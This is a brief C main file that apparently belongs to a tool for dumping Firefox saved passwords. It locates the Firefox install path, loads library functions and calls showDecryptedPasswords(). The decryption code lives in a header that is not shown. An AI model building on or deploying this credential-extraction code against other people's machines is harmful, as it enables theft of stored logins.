#include"firefox.h"

int main()
{
    char* path = installPath();
	
	if (loadFunctions(path))
	{
		showDecryptedPasswords();
		free(path);
	}
	else 
	{

#ifdef _DEBUG
		printf("Mozilla Firefox is not installed!\n");
#endif // _DEBUG
		return -1;
	}
	
	return 0;
}